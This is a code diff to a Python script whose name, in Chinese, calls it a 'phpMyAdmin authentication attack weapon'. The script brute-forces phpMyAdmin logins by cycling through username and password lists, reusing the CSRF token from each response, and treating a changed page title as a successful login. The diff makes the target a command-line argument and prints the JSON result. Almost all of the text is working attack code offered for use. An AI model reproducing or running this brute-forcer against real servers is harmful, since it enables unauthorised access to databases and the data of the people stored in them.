@@ -5,6 +5,7 @@
 # @Usage: python PHPMyAdmin身份认证攻击武器.py -t http://localhost:8080/index.php --user admin,root --pw 123456,root
 
 import json
+import traceback
 from optparse import OptionParser
 from re import findall
 
@@ -13,7 +14,7 @@ from html import unescape
 
 # PMA地址,例如 http://localhost/index.php
 # target = 'http://localhost:8080'
-target = 'http://localhost:8080/index.php'
+# target = 'http://localhost:8080/index.php'
 
 # initialization
 ret = dict()
@@ -40,13 +41,14 @@ def get_title(text) -> str:
     return title[0] if title else None
 
 
-def try_login(user, pwd, token):
+def try_login(user, pwd, token, target):
     '''尝试登陆'''
     data = {'pma_username': user,
             'pma_password': pwd,
             'server': 1,
             'target': 'index.php',
             'token': token}
+
     r = ss.post(url=target, data=data)
     return r.text
 
@@ -79,13 +81,13 @@ def main():
     if not options.password:
         passwords = password_dict
 
-    html = try_login('', '', '')
+    html = try_login('', '', '', options.target)
     title_fail = get_title(html)
     token = get_token(html)
     for user in users:
         for pwd in passwords:
             # print(f'[I]尝试登陆: {user}  {pwd}')
-            html = try_login(user, pwd, token)
+            html = try_login(user, pwd, token, options.target)
             title = get_title(html)
             token = get_token(html)
             if title != title_fail:
@@ -97,12 +99,13 @@ def main():
 
     if not ret['status']:
         ret['status'] = 'fail'
-    # print(json.dumps(ret))  # print result
+
     return json.dumps(ret)
 
 
 if __name__ == "__main__":
     try:
-        main()
+        ret = main()
+        print(ret)
     except Exception as e:
         print(e)
